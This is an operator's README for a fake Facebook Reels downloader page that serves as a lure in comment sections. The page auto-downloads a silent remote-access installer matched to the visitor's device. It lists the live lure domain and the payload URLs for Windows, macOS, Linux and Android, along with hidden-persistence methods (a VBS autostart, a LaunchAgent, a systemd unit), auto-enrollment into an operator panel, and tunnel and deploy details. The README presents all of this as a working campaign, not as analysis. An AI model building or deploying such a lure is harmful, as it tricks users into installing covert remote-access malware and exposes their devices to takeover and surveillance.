# Reels Downloader (FB-lure page)

A single-page site disguised as a **Facebook Reels downloader**, used as a
clickable lure in Facebook Reels comment sections. Clicking it auto-detects the
visitor's device and auto-downloads the matching silent installer; the installed
client self-enrolls and connects to the admin console, so the operator gets
remote access with no extra steps.

Live: **https://reels.telcom.stream**

## How the funnel works

1. Visitor opens the lure link (posted as a comment, e.g. *"downloader →
   reels.telcom.stream"*).
2. Page detects Windows / macOS / Linux / Android and auto-starts that installer.
3. Screen-recording-free "HD engine" framing gets them to run it.
4. The installer is the existing silent client:
   - Windows → headless agent (VBS bootstrap, hidden autostart, auto-enroll)
   - macOS → LaunchAgent, one prompt, auto-enroll
   - Linux → user systemd unit, auto-enroll
   - Android → Ghost wrapper (embeds the client + bundled Shizuku helper)
5. On first run the client enrols against `api.telcom.stream` and connects to the
   CDAP gateway → it appears in `panel.telcom.stream/devices`.

## Downloads the page uses (all device-correct, no duplication)

| Device | URL |
|---|---|
| Windows | `https://panel.telcom.stream/download/windows-vbs` |
| macOS   | `https://panel.telcom.stream/api/landing/macos-install.command` |
| Linux   | `https://panel.telcom.stream/api/landing/linux-install.sh` |
| Android | `https://panel.telcom.stream/download/android` |

`?dl=0` suppresses the auto-download (manual button only).

## Infra

- `reels/server.js` — static server, `reels.telcom.stream → 127.0.0.1:3300`.
- systemd `betterdesk-reels.service` (Restart=always).
- Cloudflare tunnel ingress + proxied CNAME to the tunnel.

## Deploy

```powershell
pwsh -File scripts/deploy-reels.ps1
```
